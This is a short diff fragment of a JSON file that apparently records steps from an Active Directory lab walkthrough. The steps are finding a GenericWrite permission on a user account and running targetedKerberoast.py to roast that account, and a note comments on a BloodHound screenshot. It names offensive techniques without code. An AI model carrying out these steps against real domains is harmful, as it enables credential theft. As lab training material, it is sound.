+      "Identify GenericWrite permission over BORIS.CRAWFORD@LASER.COM",
+      "Execute targetedKerberoast.py as yulia.weber to roast boris.crawford"
+    ],
+    "notes": "Critical BloodHound graph screenshot from labs/laser/walkthrough.md (line 148): Laser has 0 staged SharpHound JSON bundles and the adjacent Markdown block only wrote bare 'GenericWrite' without naming target principal BORIS.CRAWFORD@LASER.COM."
+  }
+]
